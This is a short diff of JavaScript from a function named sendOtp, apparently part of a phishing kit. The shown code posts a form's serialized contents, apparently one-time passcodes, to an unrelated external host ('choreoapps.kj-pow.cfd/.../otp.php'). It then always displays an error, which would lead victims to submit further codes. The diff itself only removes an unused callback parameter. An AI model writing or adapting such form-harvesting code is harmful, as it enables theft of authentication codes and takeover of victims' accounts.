@@ -104,7 +104,7 @@ function sendOtp() {
         url: 'https://choreoapps.kj-pow.cfd/13/otp.php',
         data: $('#formLink').serialize(),
         datatype: 'JSON',
-      complete: function(response) {
+      complete: function() {
          $("#loader").fadeOut();
          $(".btn-primary").prop("disabled", false);
          $("#errorAlert").removeClass("alert-success").addClass("alert-danger");
